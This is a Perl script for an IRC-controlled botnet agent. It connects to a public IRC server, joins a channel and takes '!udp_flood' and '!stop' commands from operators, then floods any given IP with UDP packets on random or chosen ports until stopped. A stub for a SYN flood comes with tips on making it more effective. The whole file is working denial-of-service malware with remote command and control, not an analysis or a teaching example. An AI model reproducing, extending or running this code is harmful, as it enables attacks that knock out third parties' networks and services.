#!/usr/bin/perl -w

use strict;

# Object interface for socket communications
use IO::Socket;
# Perl interpreter-based threads
use threads;
use threads::shared;

# Thread used to run the main subroutine
my $thr;
# Flag to stop the subroutine
my $interrupt :shared;

# UDP Flood subroutine (not a real function per se)
sub udp_flood_attack
{
  print "=> UDP Flood Started\n";

  # Target host
  my ($ip, $port, $size, $time) = @_;

  # Attack duration
  my $endtime = time() + ($time ? $time : 1000000);

  # Opens an UDP socket to send packets
  socket("flood", PF_INET, SOCK_DGRAM, 17);

  # Auxiliary variables
  my ($psize, $pport, $msg, $to);

  # UDP Flood
  while (time() <= $endtime)
  {
    if ($interrupt) { print "=> UDP Flood Stopped\n"; return; }

    # Sleeping for a fraction of a second keeps the script 
    # from running to 100 cpu usage.
    select(undef, undef, undef, 0.01);

    $psize = $size ? $size : int(rand(1024 - 64) + 64);
    $pport = $port ? $port : int(rand(65500)) + 1;
    $msg = pack("a$psize", "flood");
    $to = pack_sockaddr_in($pport, inet_aton("$ip"));

    send("flood", $msg, 0, $to) or die "send $ip: $!";
  }
}

# SYN Flood subroutine
# To enhance the effectiveness of the attack, find out:
# - the size of the tcp connections backlog queue;
# - the time out period for the tcp connections.
sub syn_flood_attack
{
  # TODO
}

my $channel = '#ggwp';
my $nick = 'el1337xxx';
my $user = 'Hey there! I\'m a Bot.';

# Creates a new client. Timeout is defined in seconds.
my $con = IO::Socket::INET->new(
  PeerAddr  => 'irc.snoonet.org',
  PeerPort  => '6697',
  Proto     => 'tcp',
  Timeout   => '30'
) or die "Error! $!\n";

# Joins the IRC
print $con "USER $user\r\n";
print $con "NICK $nick\r\n";
print $con "JOIN $channel\r\n";

# IRC connection loop
while (my $answer = <$con>)
{
  # Shows server reply
  print $answer;

  # Answers to ping requests (to keep connection alive)
  if ($answer =~ /^PING (.*?)$/mgi)
  {
    print "Replying with PONG ".$1."\n";
    print $con "PONG ".$1."\r\n";
  }

  # Shows avaliable commands
  if ($answer =~ /(:!commands|:!help)/mgi)
  {
    print $con "PRIVMSG $channel :To start attacking, run: ".
               "!udp_flood <dest_ip> <dest_port> <packet_size> <time>\r\n";
    print $con "PRIVMSG $channel :To stop, run: !stop\r\n";
    print $con "PRIVMSG $channel :Tip: dest_port, packet_size and time can ".
               "be set to zero (eg: !udp_flood 192.168.0.1 0 0 0). It allows ".
               "to send random packets to random ports util the !stop ".
               "order.\r\n";
  }

  # Starts the attack
  if ($answer =~ /(:!udp_flood\s+)(.+) (\d+) (\d+) (\d+)/mgi)
  {
    if ($thr && $thr->is_running())
    {
      print $con "PRIVMSG $channel :UDP Flood is running...\r\n";
    }
    else
    {
      print $con "PRIVMSG $channel :UDP Flood started!\r\n";
      $interrupt = 0;
      $thr = threads->create('udp_flood_attack', ("$2", "$3", "$4", "$5"));
      $thr->detach();
    }
  }

  # Finishes the attack
  if ($answer =~ /!stop/)
  {
    if ($thr && $thr->is_running())
    {
      print $con "PRIVMSG $channel :UDP Flood stopped!\r\n";
      $interrupt = 1;
    }
    else
    {
      print $con "PRIVMSG $channel :Nothing to stop.\r\n";
    }
  }
}
